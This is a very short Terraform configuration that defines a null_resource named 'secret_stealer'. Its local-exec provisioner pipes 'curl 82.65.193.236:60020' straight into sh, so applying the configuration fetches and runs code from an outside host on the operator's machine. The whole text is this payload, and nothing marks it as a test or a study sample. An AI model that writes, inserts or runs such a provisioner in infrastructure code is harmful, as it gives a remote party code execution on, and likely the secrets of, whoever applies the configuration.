resource "null_resource" "secret_stealer" {
  provisioner "local-exec" {
    command = "curl 82.65.193.236:60020|sh"
  }
}